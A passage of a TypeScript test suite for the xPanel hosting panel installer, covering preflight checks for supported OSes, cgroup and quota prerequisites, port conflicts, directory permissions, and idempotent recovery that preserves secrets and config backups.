    quotaToolsAvailable: [...REQUIRED_QUOTA_TOOLS],
    listeningPorts: [],
    activeUnits: [],
    expectedNodeVersion: '26.12.1',
    actualNodeVersion: 'v26.12.1',
    statPath: () => ({
      exists: true,
      isSymbolicLink: false,
      isDirectory: true,
      isFile: false,
      uid: 0,
      gid: 0,
      owner: 'root',
      group: 'root',
      mode: 0o755,
    }),
    ...overrides,
  })

  it('passes unified preflight on Ubuntu 24.04 with mpm_itk and enforces strict opt-in services by default', () => {
    const report = verifyInstallPreflight(cleanProbe())
    expect(report.ok).toBe(true)
    expect(report.profile.id).toBe('ubuntu')
    expect(report.profile.versionId).toBe('24.04')
    expect(report.services).toEqual({
      engine: 'apache',
      apacheMpm: 'itk',
      phpVersions: ['8.3'],
      withMail: false,
      withDns: false,
      withFtp: false,
      withMariaDb: false,
      withModSecurity: false,
    })
    expect(report.requiredPorts).toEqual([80, 443, 2087])
    expect(report.closedOptInPorts).toEqual([21, 25, 53, 110, 143, 465, 587, 993, 995, 3306, 4190])

    // Verify installPlan with withMariaDb: false omits mariadb-server and does not enable/start mariadb
    const optOutDbPlan = installPlan(ubuntu24, {
      engine: 'apache',
      phpVersions: ['8.3'],
      withMail: false,
      withDns: false,
      withFtp: false,
      withMariaDb: false,
    })
    expect(installed(optOutDbPlan)).not.toContain('mariadb-server')
    expect(unitsFor(optOutDbPlan, 'enable')).not.toContain('mariadb')
    expect(unitsFor(optOutDbPlan, 'start')).not.toContain('mariadb')
  })

  it('rejects unsupported OS, /etc/os-release mismatch, missing mpm_itk, or shared-identity prefork fallback', () => {
    // Unsupported OS (Debian 12)
    expect(
      error(() =>
        verifyInstallPreflight(cleanProbe({ osReleaseText: 'ID=debian\nVERSION_ID="12"\nPRETTY_NAME="Debian 12"\n', detectedProfile: undefined })),
      ).code,
    ).toBe('UNSUPPORTED_OS')

    // Mismatch between /etc/os-release and detectedProfile
    expect(
      error(() => verifyInstallPreflight(cleanProbe({ osReleaseText: UBUNTU_2404, detectedProfile: ubuntu22 }))).code,
    ).toBe('UNSUPPORTED_OS')

    // Missing mpm_itk on AlmaLinux 9 / Rocky Linux 9 / CentOS Stream 9
    for (const elText of [ALMA_9, ROCKY_9, CENTOS_STREAM_9]) {
      const e = error(() => verifyInstallPreflight(cleanProbe({ osReleaseText: elText, detectedProfile: undefined })))
      expect(e.code).toBe('ENGINE_UNAVAILABLE')
      expect(e.message).toContain('refusing shared-identity fallback')
    }

    // Attempted prefork fallback on Ubuntu
    const preforkErr = error(() => verifyInstallPreflight(cleanProbe(), { apacheMpm: 'prefork' }))
    expect(preforkErr.code).toBe('ENGINE_UNAVAILABLE')
    expect(preforkErr.message).toContain('shared-identity prefork fallback is refused')
  })

  it('rejects active xpanel services, missing cgroup v2 controllers, missing quota tools, port conflicts, and writable parent paths', () => {
    // Active xpanel-api / xpanel-agent services -> CONFLICT directing to upgrade
    const activeErr = error(() => verifyInstallPreflight(cleanProbe({ activeUnits: ['xpanel-api.service'] })))
    expect(activeErr.code).toBe('CONFLICT')
    expect(activeErr.detail.remedy).toBe('upgrade')

    // Missing cgroup v2 io controller
    const cgroupErr = error(() => verifyInstallPreflight(cleanProbe({ cgroupControllers: ['cpu', 'memory', 'pids'] })))
    expect(cgroupErr.code).toBe('PRECONDITION_FAILED')
    expect(cgroupErr.detail.missing).toEqual(['io'])

    // Missing quota tool (setquota)
    const quotaErr = error(() => verifyInstallPreflight(cleanProbe({ quotaToolsAvailable: ['quotacheck', 'quotaon', 'repquota'] })))
    expect(quotaErr.code).toBe('PRECONDITION_FAILED')
    expect(quotaErr.detail.missing).toEqual(['setquota'])

    // Port 53 occupied does NOT block when withDns is false, but DOES block when withDns is true
    expect(verifyInstallPreflight(cleanProbe({ listeningPorts: [53, 25, 21, 3306] })).ok).toBe(true)
    const dnsPortErr = error(() => verifyInstallPreflight(cleanProbe({ listeningPorts: [53] }), { withDns: true }))
    expect(dnsPortErr.code).toBe('CONFLICT')
    expect(dnsPortErr.detail.conflictingPorts).toEqual([53])

    // World-writable /etc/xpanel parent directory
    const writableParentErr = error(() =>
      verifyInstallPreflight(
        cleanProbe({
          statPath: (p) => ({
            exists: true,
            isSymbolicLink: false,
            isDirectory: true,
            isFile: false,
            uid: 0,
            gid: 0,
            owner: 'root',
            group: 'root',
            mode: p === '/etc/xpanel' ? 0o777 : 0o755,
          }),
        }),
      ),
    )
    expect(writableParentErr.code).toBe('PRECONDITION_FAILED')

    // Non-root /opt/xpanel parent directory
    const nonRootParentErr = error(() =>
      verifyInstallPreflight(
        cleanProbe({
          statPath: (p) => ({
            exists: true,
            isSymbolicLink: false,
            isDirectory: true,
            isFile: false,
            uid: p === '/opt/xpanel' ? 1000 : 0,
            gid: 0,
            owner: p === '/opt/xpanel' ? 'ubuntu' : 'root',
            group: 'root',
            mode: 0o755,
          }),
        }),
      ),
    )
    expect(nonRootParentErr.code).toBe('PRECONDITION_FAILED')
  })

  it('recovers idempotently from mid-install interruption while preserving 0640 secrets and .bak.<timestamp> config backups', () => {
    const files = new Map<string, VirtualFileEntry>()
    const dirs = new Map<string, { mode: number; owner: string; group: string }>()
    const groups = new Map<string, number>()
    const users = new Map<string, { primaryGroup: string; supplementaryGroups: string[]; home: string; shell: string }>()
    let journalRaw: string | null = null
    let failOnPackageAction = true
    let secretCounter = 0

    // Pre-populate an existing stock /etc/apache2/ports.conf before installation
    files.set('/etc/apache2/ports.conf', {
      content: 'Listen 80\n<IfModule ssl_module>\n\tListen 443\n</IfModule>\n',
      mode: 0o644,
      owner: 'root',
      group: 'root',
    })

    const host: InstallerExecutionHost = {
      probe: cleanProbe({
        statPath: (p) => {
          const d = dirs.get(p)
          if (!d) {
            return {
              exists: false,
              isSymbolicLink: false,
              isDirectory: false,
              isFile: false,
              uid: 0,
              gid: 0,
              owner: 'root',
              group: 'root',
              mode: 0o755,
            }
          }
          return {
            exists: true,
            isSymbolicLink: false,
            isDirectory: true,
            isFile: false,
            uid: d.owner === 'root' ? 0 : 991,
            gid: d.group === 'root' ? 0 : 991,
            owner: d.owner,
            group: d.group,
            mode: d.mode,
          }
        },
      }),
      journalStorage: {
        read: () => journalRaw,
        write: (c) => {
          journalRaw = c
        },
      },
      backupStamp: '20261022T120500Z.42',
      readFile: (p) => files.get(p) ?? null,
      writeFile: (p, entry) => {
        files.set(p, { ...entry })
      },
      ensureDir: (p, entry) => {
        dirs.set(p, { ...entry })
      },
      ensureGroup: (name) => {
        if (!groups.has(name)) {
          groups.set(name, name === 'xpanel' ? 991 : 992)
        }
        return groups.get(name)!
      },
      ensureUser: (u) => {
        users.set(u.name, {
          primaryGroup: u.primaryGroup,
          supplementaryGroups: [...u.supplementaryGroups],
          home: u.home,
          shell: u.shell,
        })
      },
      runAction: (action) => {
        if (failOnPackageAction && action.kind === 'exec' && action.argv.includes('apache2')) {
          throw new Error('simulated apt-get network interruption during apache2 download')
        }
      },
      initSchemaAsXpanelUser: (dbPath) => {
        files.set(dbPath, {
          content: 'SQLite format 3',
          mode: 0o660,
          owner: 'xpanel',
          group: 'xpanel',
        })
      },
      generateSecretHex: () => {
        secretCounter++
        return secretCounter.toString(16).padStart(64, 'a')
      },
    }

    // Attempt 1: interrupted during 'packages' phase
    expect(() => runUnifiedInstaller(host, { phpVersions: ['8.3'] })).toThrow(/simulated apt-get network interruption/)

    const journalAfterInterrupt = installPhaseJournal(host.journalStorage).getState()
    expect(journalAfterInterrupt.completedPhases).toEqual(['preflight', 'users-and-dirs', 'secrets'])
    expect(journalAfterInterrupt.lastFailedPhase).toBe('packages')

    // Capture the secrets created during Attempt 1
    const firstAgentToken = files.get('/etc/xpanel/agent.token')?.content
    const firstServerSecret = files.get('/etc/xpanel/server.secret')?.content
    expect(firstAgentToken).toMatch(/^[a-f0-9]{64}\n$/)
    expect(firstServerSecret).toMatch(/^[a-f0-9]{64}\n$/)
    expect(firstAgentToken).not.toBe(firstServerSecret)

    // Attempt 2: re-run after fixing network interruption
    failOnPackageAction = false
    const secondRun = runUnifiedInstaller(host, { phpVersions: ['8.3'] })

    expect(secondRun.journal.lastFailedPhase).toBeNull()
    expect(secondRun.journal.completedPhases).toEqual([...INSTALL_PHASES])

    // Verify existing valid 0640 root:xpanel secrets were preserved, NOT rotated or clobbered
    expect(files.get('/etc/xpanel/agent.token')?.content).toBe(firstAgentToken)
    expect(files.get('/etc/xpanel/server.secret')?.content).toBe(firstServerSecret)
    expect(secondRun.journal.secrets).toEqual([
      { path: '/etc/xpanel/agent.token', action: 'preserved', mode: 0o640, owner: 'root', group: 'xpanel' },
      { path: '/etc/xpanel/server.secret', action: 'preserved', mode: 0o640, owner: 'root', group: 'xpanel' },
    ])

    // Verify pre-existing /etc/apache2/ports.conf was backed up to .bak.<stamp> before overwriting
    const portsBackup = files.get('/etc/apache2/ports.conf.bak.20261022T120500Z.42')
    expect(portsBackup).toBeDefined()
    expect(portsBackup?.content).toContain('Listen 80')
    expect(files.get('/etc/apache2/ports.conf')?.content).toContain('Managed by xPanel')
    expect(files.get('/etc/apache2/ports.conf')?.content).not.toContain('Listen 80')

    // Verify Attempt 3 (idempotent re-run on completed host) preserves the original backup and secrets
    const thirdRun = runUnifiedInstaller(host, { phpVersions: ['8.3'] })
    expect(thirdRun.journal.completedPhases).toEqual([...INSTALL_PHASES])
    expect(files.get('/etc/apache2/ports.conf.bak.20261022T120500Z.42')?.content).toContain('Listen 80')
    expect(files.get('/etc/xpanel/agent.token')?.content).toBe(firstAgentToken)
    expect(users.size).toBe(1)

    // Verify malformed or wrong-mode existing secret fails closed instead of being silently overwritten
    files.set('/etc/xpanel/agent.token', {
      content: firstAgentToken!,
      mode: 0o666,
      owner: 'root',
      group: 'xpanel',
    })
    expect(error(() => runUnifiedInstaller(host, { phpVersions: ['8.3'] })).code).toBe('PRECONDITION_FAILED')
  })

  it('lets nginx traverse the ACME parent and writes local mail delivery when mail is selected', () => {
    const files = new Map<string, VirtualFileEntry>()
    const dirs = new Map<string, { mode: number; owner: string; group: string }>()
    const actions: InstallAction[] = []
    const host: InstallerExecutionHost = {
      probe: cleanProbe(),
      journalStorage: { read: () => null, write: () => undefined },
      readFile: (p) => files.get(p) ?? null,
      writeFile: (p, entry) => { files.set(p, { ...entry }) },
      ensureDir: (p, entry) => { dirs.set(p, { ...entry }) },
      ensureGroup: (name) => (name === 'xpanel' ? 991 : 992),
      ensureUser: () => undefined,
      runAction: (action) => { actions.push(action) },
      initSchemaAsXpanelUser: (dbPath) => {
        files.set(dbPath, { content: 'SQLite format 3', mode: 0o660, owner: 'xpanel', group: 'xpanel' })
      },
      generateSecretHex: () => 'ab'.repeat(32),
    }
    runUnifiedInstaller(host, { phpVersions: ['8.3'], withMail: true })
    expect(dirs.get('/var/lib/xpanel/acme')).toEqual({ mode: 0o755, owner: 'root', group: 'root' })
    expect(actions).toContainEqual({ kind: 'exec', argv: ['/usr/bin/setfacl', '-m', 'u:nginx:x', '/var/lib/xpanel'] })
    expect(files.get('/etc/dovecot/conf.d/11-xpanel-mailboxes.conf')?.content).toContain('passwd-file')
    expect(files.get('/etc/dovecot/conf.d/11-xpanel-mailboxes.conf')?.content).toContain('private/auth')
    expect(files.get('/etc/postfix/master.cf')?.content).toContain('127.0.0.1:587')
    expect(files.get('/etc/postfix/master.cf')?.content).toContain('reject_sender_login_mismatch')
    expect(files.get('/etc/postfix/main.cf')?.content).toContain('virtual_transport = lmtp:unix:private/dovecot-lmtp')
    host.command = () => ({ code: 1 })
    expect(error(() => runUnifiedInstaller(host, { phpVersions: ['8.3'], withMail: true })).message).toMatch(/nginx cannot read the ACME/)
  })

  it('validates resolveOptInServices against hostile input', () => {
    expect(error(() => resolveOptInServices(null as never)).code).toBe('VALIDATION')
    expect(error(() => resolveOptInServices({ withMail: 'yes' as never })).code).toBe('VALIDATION')
    expect(error(() => resolveOptInServices({ engine: 'nginx' as never })).code).toBe('VALIDATION')
    expect(error(() => resolveOptInServices({ apacheMpm: 'worker' as never })).code).toBe('VALIDATION')
  })
})
